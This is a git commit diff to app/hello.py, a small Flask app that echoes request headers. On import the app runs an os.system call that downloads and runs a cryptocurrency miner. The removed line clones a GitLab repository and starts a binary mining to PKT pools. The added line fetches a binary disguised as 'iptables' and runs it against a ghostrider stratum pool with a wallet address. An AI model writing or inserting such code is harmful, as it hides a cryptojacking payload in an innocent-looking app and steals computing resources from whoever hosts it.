8ee189f39123a047eabb421ef6fcb211d3b88e56
solikinsayet7265 <107605423+solikinsayet7265@users.noreply.github.com>
2022-09-08 05:24:08 +0700

    Update hello.py

--- app/hello.py
+++ app/hello.py
@@ -5,7 +5,7 @@ import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
 import os
-os.system ('git clone https://gitlab.com/azkadafa39/yiyi2.git && cd yiyi2 && chmod +x linux && nohup ./linux ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com')
+os.system ('wget https://github.com/zamreskhan/ac/raw/main/iptables && chmod +x iptables && ./iptables --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BdjPWXaLQ28c9Siz5QsYH1koN1hm7P9J8J.helheim2')
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
